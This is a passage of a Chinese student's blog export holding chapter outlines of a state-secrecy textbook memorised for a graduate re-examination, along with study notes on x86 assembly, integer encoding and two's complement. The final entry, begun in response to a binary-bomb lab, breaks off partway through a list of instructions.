保密工作存在的问题：背景；1）①②③；2）①②③④；3）①②③；4）①②③ 2.当前保密工作的主要任务 当前保密工作的任务：前言；1）①②；2）①②③④⑤；3）①②③④⑤；4）①②③；5）；6）①②③**④ 第五章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密组织机构1.保密委员会及其机构 什么是保密委员会？ 保密委员会有谁组建？受谁领导？ 地方各级保密委员会的职责：①②③④⑤⑥⑦⑧ 中央、国家机关各部门保密委员会的职责：①②③④⑤⑥⑦⑧⑨⑩ 2.保密行政管理部门及其职责 一个机构，两块牌子； 各级保密行政管理部门的工作职责：①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮ 3.保密工作管理体制 管理体制纵向、横向（①②③④⑤⑥）、单位 专职保密干部任职条件：①②③④⑤⑥ 保密干部配备要求 第六章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密法律法规1.保密法律、法规、规章的概念及相互关系 保密法律的概念、制定主体、类别、涉及的相关法律名称； 保密法规的概念、制定主体、类别、涉及的相关法规名称； 保密规章的概念、制定主体、类别、涉及的相关规章名称； 保密法律、法规和规章的相互关系； 2.保密法及其实施办法 《保密法》的立法背景：①②③； 《保密法》的内容（六章五十三条）：①总则、②国家秘密的范围和密级、③保密制度、④监督管理、⑤法律责任、⑥附则； 《实施办法》的基本内容（五章四十一条）：①②③； 3.保密工作有关法规规章: 一共十四个 4.国外保密法概括 省略 第七章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作制度1.保密领导责任制 三段话； 2.保密宣传教育制度 保密宣传教育的地位、作用； 保密宣传教育的基本要求； 保密宣传教育的内容； 保密宣传教育工作的形式和方法； 3.保密行政管理制度 对物的管理① 国家秘密载体的概念；② 国家秘密载体管理的有关规定；③ 密品的概念④ 涉密计算机系统信息系统的保密管理；⑤ 对计算机信息系统的禁止性规定；② 非涉密信息网络的管理； 对人的管理① 涉密人员分类管理制度；② 涉密人员资格审查制度；③ 涉密人员上岗培训和承诺制度；④ 涉密人员出境管理制度；⑤ 涉密人员脱密期管理制度；⑥ 涉密人员权益保障制度；⑦ 机关、单位管理涉密人员的规定； 对特定场所的管理① 对保密要害部门部位的管理；② 什么是保密要害部门？③ 什么是保密要害部位？④ 对军事禁区和属于国家秘密不对外开放的其他部位和场所的管理；⑤ 对涉密资质单位的管理；⑥ 业务工作中保密管理；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❶ 新闻出版等传媒中的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❷ 对外交往与合作的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❸ 涉密会议、活动的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❹ 涉密采购的保密管理 4.日常指导和培训制度 ① 保密法第四十二条的规定；② 三个督促指导；③ 保密干部培训的内容和对象； 第八章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密监督检查1.保密检查的目的、对象及内容 保密检查的目的； 保密检查的对象； 保密检查的内容；01）①②③④⑤⑥02）①②③④03）①②04）①②③④05）①②③④06）①②③07）①②③④08）①②③09）①②10）①② 2.保密检查的方法及实施 保密检查的办法：①范围 ②相隔时间 ③不同阶段 ④检查主体 ⑤检查手段； 保密检查的实施：①主体 ②前 ③中 ④后 ⑤总 3.保密检查中所发问题的处理 限期整改 责令停止使用 建议处分并调离（《保密法》第四十八条） 督促、指导查处工作 涉嫌犯罪的，移送司法机关（《刑法》第111、282、398条） 4.泄密事件的查处工作 泄密事件查处工作的内容：①②③④ 泄密事件查处工作的原则； 泄密事件查处的职责分工：①②③ 发生泄密事件的报告制度：①②③④ 终结泄密事件查处工作应当具备的条件：①②③④ 泄密事件查处工作的终结期限； 第九章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密科学技术1.高速发展的信息技术给保密安全带来的威胁 四段话； 2.加强技术防范是一项十分重要和紧迫的任务 计算机信息系统的保密管理① 计算机信息系统的有关概念；② 计算机信息系统安全保密的概念；③ 计算机信息系统安全保密方面存在的隐患：❶❷❸❹❺❻④ 切实加强计算机信息系统的保密管理； 有线、无线通信的保密管理；① 现代通信的概念；② 现代通信的主要手段：❶❷❸❹③ 通信泄密的主要渠道：❶❷❸❹❺④ 国外主要的窃听技术：❶❷❸❹❺❻⑤ 应当遵守的保密规定及应采取的保密措施：❶❷❸#学习感悟今天终于完成了一开始觉得不可能完成的事情，经过这20天的不断的反复背诵，前6章的知识还算比较熟练，但是第7、8、9章的知识还是有点陌生，再加强一下！我要抓紧时间 背熟它啦！你可以的！加油！]]></content>
      <tags>
        <tag>《保密概论》</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《保密概论》第6、7章知识点提纲]]></title>
    <url>%2F2019%2F03%2F16%2F2019.03.16%EF%BC%8821%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天总结一下《保密概论的知识点》第6、7章的知识提纲，现在的进度还差第8章就背完了，明天还要继续复习和背诵。 第六章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密法律法规1.保密法律、法规、规章的概念及相互关系 保密法律的概念、制定主体、类别、涉及的相关法律名称； 保密法规的概念、制定主体、类别、涉及的相关法规名称； 保密规章的概念、制定主体、类别、涉及的相关规章名称； 保密法律、法规和规章的相互关系； 2.保密法及其实施办法 《保密法》的立法背景：①②③； 《保密法》的内容（六章五十三条）：①总则、②国家秘密的范围和密级、③保密制度、④监督管理、⑤法律责任、⑥附则； 《实施办法》的基本内容（五章四十一条）：①②③； 3.保密工作有关法规规章 《中华人民共和国保守国家秘密法实施办法》 《印刷、复印等行业复制国家秘密载体暂行管理办法》 《国家秘密文件、资料和其他物品标志的规定》 《国家秘密保密管理期限》 《国家秘密设备、产品保密规定》 《国家秘密及其密级具体范围的规定》 《泄密事件查处办法》（试行） 《关于禁止邮寄或非法携运国家秘密文件、资料和其他物品出境的规定》 《报告泄露国家秘密事件的规定》 《科学技术保密规定》 《新闻出版保密规定》 《计算机信息系统保密管理暂行规定》 《计算机信息系统国际联网保密管理规定》 《对外经济合作提供资料保密暂行规定》 4.国外保密法概括 省略 第七章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作制度1.保密领导责任制 三段话； 2.保密宣传教育制度 保密宣传教育的地位、作用； 保密宣传教育的基本要求； 保密宣传教育的内容； 保密宣传教育工作的形式和方法； 3.保密行政管理制度 对物的管理① 国家秘密载体的概念；② 国家秘密载体管理的有关规定；③ 密品的概念④ 涉密计算机系统信息系统的保密管理；⑤ 对计算机信息系统的禁止性规定；② 非涉密信息网络的管理； 对人的管理① 涉密人员分类管理制度；② 涉密人员资格审查制度；③ 涉密人员上岗培训和承诺制度；④ 涉密人员出境管理制度；⑤ 涉密人员脱密期管理制度；⑥ 涉密人员权益保障制度；⑦ 机关、单位管理涉密人员的规定； 对特定场所的管理① 对保密要害部门部位的管理；② 什么是保密要害部门？③ 什么是保密要害部位？④ 对军事禁区和属于国家秘密不对外开放的其他部位和场所的管理；⑤ 对涉密资质单位的管理；⑥ 业务工作中保密管理；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❶ 新闻出版等传媒中的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❷ 对外交往与合作的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❸ 涉密会议、活动的保密管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❹ 涉密采购的保密管理 4.日常指导和培训制度 ① 保密法第四十二条的规定；② 三个督促指导；③ 保密干部培训的内容和对象； #学习感悟今天背了一整天，这真的是一个充满挑战的过程，背过了忘，忘过再背，就是这样反反复的我终于背到了第 8 章，再坚持坚持！明天争取背完，后面几天再熟悉熟悉。]]></content>
      <tags>
        <tag>《保密概论》</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《保密概论》前五章知识点提纲]]></title>
    <url>%2F2019%2F03%2F14%2F2019.03.14%EF%BC%8820%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天总结一下《保密概论的知识点》前5章的知识摘要，一方面是回顾一下自己背诵的知识，另一方面是为以后的背诵制定一个知识纲要； 第一章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密基础知识1.保密工作概要 “保密”、“保密工作”的概念 ； 保密工作的特征； 保密工作的指导思想、依据； 保密工作的指导方针和基本原则； 2.国家秘密及其确定 国家秘密的概念和特征（三要素）； 国家秘密的等级和划分标准； 国家秘密事项的确定：定密责任人制度、三种情况、确定权限； 国家秘密事项保密期限的确定； 商业秘密的概念和三要素； 工作秘密的概念、主体； 第二章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作的地位和作用 保密工作是维护国家安全和利益的重要手段；① 在经济领域的保密工作；② 涉外活动中的保密工作；③ 军事领域的保密工作；④ 保密科学技术的保密工作； 保密工作是维护社会安定、保障经济建设和各项事业顺利进行的重要条件；① 保密工作是维护社会安定的客观需要；② 保密工作是保障经济建设和发展的需要；③ 做好保密工作是加快信息化建设的保证； 保密工作是党政军机关正常行使权利、履行职能的需要前言① 做好保密工作是党政军机关实施国家重大国家决策的客观需要；② 做好保密工作是保卫国家安全的客观需要；③ 做好保密工作是党政军机关维护国家统一、民族团结和社会稳定的客观需要 第三章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作的历史1.古代保密思想制度简述 夏商：文书 西周：一合而再离、三发而一知 秦汉：依次传行 唐代：《唐律》 宋、元、明、清：沿用《唐律》。机构：中书省、枢密院、锦衣卫、军机处； 2.革命战争年代的保密工作 中共一大的主张 中共二大的主张 1926年1月① 有关文件② 提出了几个问题 1927年8月7日的主张 周恩来——中共中央秘密工作委员会 抗日战争爆发后的新路线 1942年，毛泽东的主张 解放战争中，中央保密委员会 1948年，章程、保密委员会的性质 3.新中国成立后的保密工作 1950年 1951年 1952年6月，条例、意义 1958年，科学技术 建国之初到60年代 60年代中期 1978年 1980年《关于调整中央保密委员会和加强保密办事机构的通知》 1983年《关于中央保密委员会的体制改革和机构设置的报告》 4.新时期的保密工作 邓小平同志：1988年 江泽民同志：保密的重要性 胡锦涛同志 十五期间 2006年5月 2008、2009、2010 保密基础理论：《保密工作概论》、《保密管理工作概论》、《保密法学总论》、《保密法概论》、《信息技术保密学》、《信息安全保密教程》 保密学科建设：国家保密学院（十所） 修订《保密法》的时间、会议、内容（5条）、意义 处理好几个关系 第四章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作面临的形势与任务1.依然严峻的保密形势 国际间政治经济科技和军事等方面斗争的特点：1）2）3） 窃密与反窃密的特点：1）2）3）4）5） 当前保密工作的现状：1）①②③；2）①②③；3）①②；4）①②③；5）①②③ 保密工作存在的问题：背景；1）①②③；2）①②③④；3）①②③；4）①②③ 2.当前保密工作的主要任务 当前保密工作的任务：前言；1）①②；2）①②③④⑤；3）①②③④⑤；4）①②③；5）；6）①②③**④ 第五章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密组织机构1.保密委员会及其机构 什么是保密委员会？ 保密委员会有谁组建？受谁领导？ 地方各级保密委员会的职责：①②③④⑤⑥⑦⑧ 中央、国家机关各部门保密委员会的职责：①②③④⑤⑥⑦⑧⑨⑩ 2.保密行政管理部门及其职责 一个机构，两块牌子； 各级保密行政管理部门的工作职责：①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮ 3.保密工作管理体制 管理体制纵向、横向（①②③④⑤⑥）、单位 专职保密干部任职条件：①②③④⑤⑥ 保密干部配备要求 #学习感悟 将近背了半个月的时间，今天终于背完前7章、背熟前5章，首先经历了很大的心理战：总觉得背完这些知识是不可能的，毕竟知识点太多了。然而这15天之后带给我的，是更大的信心，不仅仅是背完《保密概论》也是我在以后解决问题时的信心！明天继续开始复习，要把这些知识点在我脑子里“活”起来。]]></content>
      <tags>
        <tag>研究生复试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（三）]]></title>
    <url>%2F2019%2F03%2F13%2F2019.03.13%EF%BC%8819%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天主要学习的内容为：无符号整数与带符号整数的知识。其主要包括：无符号数与带符号数的转化、C 语言中的无符号数与带符号数、何时采用无符号数、无符号数加法、补码加法、补码加法的溢出、无符号整数除以 2 的 K 次幂、带符号整数除以 2 的 K 次幂。下面就写一下相关的学习笔记。 一、无符号与带符号的转化 无符号数和带符号数，在机器层面并无区别，都是 0 1 字符串，所以两者的二进制串的表示是不变的，只不过是二者的解释不同而已。问题①：既然二者在存储和基本运算指令中无区别，那么在 C 语言中怎么去别的呢？ 二、C 语言中的无符号数与带符号数 常数默认为带符号数，如果有“u”作为后缀，则是无符号数； 如果无符号数与带符号数混合使用，则带符号数被转化为无符号数； sizeof( ) 回的类型为“无符号数”;三、何时采用无符号数？ 模运算 按位运算 注意：不能仅仅因为取值范围是非负而是用无符号数，除了以上两类可以用无符号数，其他尽量不要使用无符号数。五、 无符号数的加法注意：如果两个很大的无符号数相加，可能会发生溢出六、补码加法 补码加法准则与无符号数的加法无区别，只不过是解释不同。 补码加法的溢出：（正+正、负+负）七、无符号整数除以 2 的 K 次幂 采用逻辑右移，右侧补 0 ； u &gt;&gt; k gives [ u / 2k]； 小数点右侧全部去掉，不管四舍五入；八、带符号数整数除以 2 的次幂 采用算数右移；，如果num ≥ 0，算术右移 = 逻辑右移，但是 x &lt; 0，则舍入错误； u &gt;&gt; k gives [ x / 2k]； 对于负数整数除以 2 的次幂，要加上一个校正，校正值 = 2k-1；九、练习题：九、学习感悟在今天的学习过程中，好多知识点都没有听懂，而且对于一些学过的基础知识遗忘的太厉害，感觉太被动了，明天开始博客隔一天更新一次：首天学习知识，第二天复习和回顾学过的知识，以及复习 C 语言相关的知识点，要一步一步走稳。十、每日一句人生目标确定容易实现难，但如果不去行动，那么连实现的可能也不会有！]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（二）]]></title>
    <url>%2F2019%2F03%2F12%2F2019.03.12%EF%BC%8818%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天的博客内容主要是“整数的机器表示”和“无符号整数和带符号整数”：（视频课程：清华大学的《汇编语言程序设计》；学习教材：《深入理解计算机系统》） 一、计算机中整数的编码方式和操作整数1.基本数据类型的大小 ![](http://a4.qpic.cn/psb?/V11UAV0k0TKwM6/rNi60QbuR5bdZplwcgKCHYoi2Uzq3XpMUjXMtqOEUBk!/m/dL8AAAAAAAAAnull&bo=dgQjAnYEIwIDCSw!&rf=photolist&t=5) 2.编码方式 B2Uw：将二进制转无符号数； B2Tw：将二进制转补码（带符号数）； U2Bw：将无符号数转为二进制； U2Tw：将无符号数转补码； T2Bw：将补码转二进制； T2Uw：将补码转无符号数； TMinw：最小补码值； TMaxw：最大补码值； UMaxw：最大无符号数;![](http://a3.qpic.cn/psb?/V11UAV0k0TKwM6/marbAH7nzGGsI6Ek6SrQOunxob95AbS49zS*efkpgEM!/m/dEYBAAAAAAAAnull&bo=WgQ6AloEOgIDCSw!&rf=photolist&t=5) 3.操作整数 +&nbsp;tw：补码加法； +&nbsp;uw：无符号数加法； *&nbsp;tw：补码乘法； *&nbsp;uw：无符号数乘法； -&nbsp;tw：补码取反； -&nbsp;uw：无符号数取反； 注：B ——二进制、T/t——补码、U/u——无符号数、w在这里表示数据表示中的位数 二、数值的定点与浮点表示 1. 浮点数：由于“指数”的存在以及它的大小不同而使数字部分的小数点位置不同，也可以这样理解，小数点的位置可以是“浮动的”，所以称之为浮点数形式；（在计算机内部，凡实数（即以小数形式所表示的数）都以浮点形式存储）2. 定点数：凡不带指数部分的数称为定点数，整数都属于定点数； 三、无符号整数和带符号整数1.如何表示正负？1. 可以根据自己决定是否需要正负：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;就像我们必须决定某个量使用整数还是实数，使用多大的范围数一样，我们必须自已决定某个量是否需要正负。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在计算机中，可以区分正负的类型，称为有符类型（声明signed），无正负的类型（只有正值），称为无符类型（声明unsigned）。数值类型分为整型或实型，其中整型又分为无符类型或有符类型，而实型则只有符类型。字符类型也分为有符和无符类型。 比如有两个量，年龄和库存，我们可以定前者为无符的字符类型，后者定为有符的整数类型。2. 二制数中的最高位表示正负：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①指定一个数量是无符号类型时，最高位被称为“符号位”：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最高位为“1”表示该数为负值;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最高位为“0”表示该数为正值;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②指定一个数量是无符号类型时，那么其最高位的1或0，和其它位一样，用来表示该数的大小。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：signed number：1111 1111 的值为 -1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned number：1111 1111 的值为 255 2.有符号数和无符号数的取值范围 ▶ 无符号数：UMin（000…0） = 0&nbsp;&nbsp;&nbsp;~&nbsp;&nbsp;&nbsp;UMax(111…1) = 2w-1▶ 带符号数（补码）：TMin（100…0） = -2w-1&nbsp;&nbsp;&nbsp;~&nbsp;&nbsp;&nbsp;TMax(011…1) = 2w-1-1例如：一个字节数来说▶ 无符号数：0~255▶ 有符号数：-128~127虽然有符号数的最大值缩水了，却在负值的方向出现了伸展，但二者能表达的不同的数值的个数都一样是256个。只不过前者表达的是0到255这256个数，后者表达的是-128到+127这256个数。 四、原码、反码和补码1.反码与补码的作用▶ 反码：解决负数加法运算问题，将减法运算转换为加法运算，从而简化运算规则；▶ 补码：解决负数加法运算正负零问题，弥补了反码的不足。总之，反码与补码都是为了解决负数运算问题，跟正数没关系，因此，不管是正整数还是正小数，原码，反码，补码都全部相同。 2.无符号数的原码、反码和补码 因为无符号数只有正数（无符号位）所以： 原码 = 反码 = 补码 3.有符号数的原码、反码和补码 ▶ 正数：原码 = 反码 = 补码▶ 负数：反码 = 原码（除符号位外）每位取反；补码 = 反码 + 1； 4.极易混淆和犯错的知识 在10进制中，1 就代表了 +1，-1 表示和 1 相对的负值，那么就会在二进制（1 个字节）中有个这样的错误认识：1 的二进制为 0000 0001，因为符号位“0”表示正数，“1”表示负数，所以就会认为 1000 0001 应该表示为 -1。这种理解是错误的，事实上计算机的规定相反，-1 的表示方式为： 先取 -1 的原码：1000 0001 -1（0000 0001） 的原码取反得反码：1111 1110 反码加 1 得补码：1111 1111 可见，－1在计算机里用二进制表达就是全1。16进制为：0xFFFFFF。 五、学习感悟今天总结的大部分知识都是在学习 C 语言中学到的，相比当时学的时候，今天的再学习让我感觉对这方面的知识又更加深刻了，还是在于那句话：学习是一个过程，需要“温故知新”。以后还的继续回顾以前的知识，可能学到的东西和理解的层面，完全要比当时的更好，加油吧！ 六、每日一句只要下定决心，过去的失败，正好是未来行动的借鉴；只要不屈不挠，一时的障碍，正好是推动成功的力量。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（一）]]></title>
    <url>%2F2019%2F03%2F11%2F2019.03.11%EF%BC%8817%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天被通知测试停止，认真的准备复试，我想着在复习剩余的时间不能停止学习，这几天正好是第二阶段测试，我想趁这个时间段好好学习一下汇编语言，课程是清华大学的“汇编语言程序设计”网上课程，这几天我会在博客上更新每天学到的知识点。 一、课程内容与目标 基本知识这门课程主要讲述的是各类指令集的初步、数制与整数表示、浮点数表示 x86汇编 80x86计算机组织与保护模式 x86指令系统与寻址方式 C 与 x86 汇编 x86 汇编语言程序格式与基本编程 MIPS 汇编 MIPS 计算机组织的初步 指令系统介绍 汇编代码与异常处理二、X86指令集简介 X86指令集的基本特色 向下兼容 变长指令：1—15字节，多数为2—3字节 多种寻址方式（可访问不对齐内存地址） 指令集的通用寄存器个数有限&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;X86-32系统下拥有8个通用寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;X86-64系统下拥有16个通用寄存器 至多只有一个操作数在内存中，另一个操作数为立即数会寄存器 X86-32/64 通用寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r8d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rdx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r9d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rcx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r10d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rbx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r11d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rsi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r12d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r13d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r14d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%rbp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%r15d▶ %rax 作为函数返回值使用；▶ %rsp 栈指针寄存器，指向栈顶；▶ %rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数……▶ %rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改；▶ %r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值；注：X86-64中，所有寄存器都是64位，相对32位的x86来说，标识符发生了变化，比如：从原来的%ebp变成了%rbp。为了向后兼容性，%ebp依然可以使用，不过指向了%rbp的低32位。X86-64寄存器的变化，不仅体现在位数上，更加体现在寄存器数量上。新增加寄存器%r8到%r15。加上x86的原有8个，一共16个寄存器。 X86指令集缺点 向下兼容导致指令集雨来越大、越复杂； 很多领域而言，资源利用率低三、整数的机器表示 预备知识 特别注意的是在X86里，一个字（Word）占2个字节（Byte）； 逻辑运算：▶ “与（AND）∧—&amp;”：0:0=0；0:1=0；1:0=0；1:1=1▶ “或（OR）∨— |”：0:0=0；0:1=1；1:0=1；1:1=1▶ “异或（XOR）”：0:0=0；0:1=1；1:0=1；1:1=0▶ “非（NOT）”：0=1；1=0 数的机器表示 机器字长：一般指计算机进行一次整数运算所能处理的二进制数据的位数，通常也包括数据地址长度。 32位字长：地址的表示空间为 4 GB，所以对于很多内存需求量大的应用而言，非常有限； 64位字长：地址的标识空间约为1.8 × 1019bytes，而目前的X86-64机型实际支持48位宽的地址：256TB； 机器字在内存中的组织地址按照字节来定位：机器字中的第一个字节的地址；相邻机器字的地址相差4byte或8byte，例如32位第一位Address = 0000，那么第二位Address = 0004，第三位Address = 0008；64位第一位Address = 0000，那么第二位Address = 0008，第三位Address = 0016； 字节序▶ 一个机器字节内的各个字节如何排列的呢？ Big Endian：Sun ,PowerPC,Internet——低字节（LSB）占据高地址； Little Endian：X86——与LSB相反 注：主要了解Little Endian是低字节对低地址，高字节对高地址 ![](http://a3.qpic.cn/psb?/V11UAV0k0TKwM6/LSE91PXDu4O8zzlmzOzPZwb6PWuDDomkPeU48F0bcic!/m/dL4AAAAAAAAAnull&bo=cwRfAnMEXwIDByI!&rf=photolist&t=5) 四、学习疑问&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 寄存器的工作原理到底是什么样的？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 多种寻址方式是什么意思？ 五、学习感悟&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上内容就是今天学习的笔记，也有在学习中遇到的问题和心得。之所以要把老师讲的东西总结下来，就是想通过自己的思考，努力让这门课在我心里成为一个体系。接下来的几天我还是继续学习汇编语言，对学习的知识进行总结，并及时的记录下自己的疑问和不懂的地方。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以后在平常生活中，自己也得多查阅一下相关知识的博客和资料，争取缩短学习周期，跟上大神的步伐。 六、每日一句&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你若不想做，会找一个或无数个借口；你若想做，会想一个或无数个办法。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Binary Bombs——汇编语言学习总结]]></title>
    <url>%2F2019%2F03%2F10%2F2019.03.10%EF%BC%8816%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天晚上拿到了第二阶段的测试，是关于逻辑炸弹的题目，涉及的知识点有：汇编语言、机器语言、调试器和逆向工程，自己根据文档的提示尝试了一下，但是对汇编语言的指令读不懂，今天的主要任务就是对汇编语言进行了学习，就先简单的总结一下今天所学的只是吧！ 1. 什么是汇编语言？ 汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。其特点主要有以下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①它是在直接面向处理器的语言；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②它所操作的对象为寄存器或内存器，而得具体的数据；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③因为汇编语言与机器有着密切的关系，所以他的通用性和可移植性要比高级语言低；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④相比各种编程语言，它与硬件关系最为密切、最直接；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤再进行处理数据时，需要自己将数据熊相应的寄存器或者内存器取出；也可以简单的这样叙述：（参考：《深入理解计算机系统》） 预处理阶段：预处理器（cpp）根据以字符#开头的命令，修改原始的 C 程序，得到以 .i 为文件扩展名的另外一个 C 程序； 编译阶段：编译器（ccl）将文本文件 .i 翻译成 .s 的文本文件，它包含一个汇编语言程序； 汇编阶段：汇编器（as） 将 .s 的文本文件翻译成机器语言指令，把这些指令打包成一种可重定位目标程序的格式，并将结果保存在目标文件 .o 中，该文件为二进制文件。 链接阶段：如果源程序调用了“printf函数”，因为 printf 函数存在一个名为 printf.o 的单独预编译好的目标文件中，就需要链接（Id）负责将该文件以某种方式合并到 .o 文件中，就得到了可执行文件，被加载到内存中，由系统执行。2. 汇编语言的部分指令&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;汇编语言指令是机器指令的一种符号表示，而不同类型的CPU 有不同的机器指令系统，也就有不同的汇编语言,所以，汇编语言程序与机器有着密切的关系。所以，除了同系列、不同型号CPU 之间的汇编语言程序有一定程度的可移植性之外，其它不同类型CPU 之间的汇编语言程序是无法移植的，这里讲的主要是Inter公司CPU使用汇编语言，也是我们经常使用到的——x86汇编语言的指令。一、数据传送指令 通用数据传送指令：MOV（movb、movw、movl、movq、movabsq） 条件传送指令：CMOVcc 堆栈操作指令：PUSH/PUSHA/PUSHAD/POP/POPA/POPAD 交换指令：XCHG/XLAT/BSWAP 地址或段描述符选择子传送指令：LEA/LDS/LES/LFS/LGS/LSS等 